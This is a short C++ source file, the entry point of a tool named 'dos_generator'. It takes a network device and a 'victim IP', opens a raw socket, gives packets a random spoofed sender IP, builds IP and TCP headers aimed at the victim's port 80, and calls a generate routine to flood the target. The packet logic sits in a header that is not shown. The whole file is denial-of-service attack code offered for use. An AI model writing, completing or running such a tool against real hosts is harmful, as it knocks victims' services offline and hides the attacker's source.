#include <iostream>
#include "dosgenerator.h"

using namespace std;

void usage()
{
    cout<<"Usage : dos_generator <dev> <victim IP> "<<endl;
    exit(1);
}
int main(int argc, char* argv[])
{
    //TODO : make glog class and remain logs.

    if(argc != 3) usage();

    DosGenerator dosGenerator;

//    init pcd for send packet
//    dosGenerator.pcd_init(argv[1]);

    dosGenerator.raw_init();

    //set target ip to argv[2]
    dosGenerator.target_ip_=argv[2];
    //set sender ip random
    dosGenerator.sender_ip_.set_rand_ip();

    //set ip header
    dosGenerator.init_iph(dosGenerator.sender_ip_,dosGenerator.target_ip_);
    dosGenerator.init_tcph(1234,80);


    dosGenerator.generate();


    return 0;
}
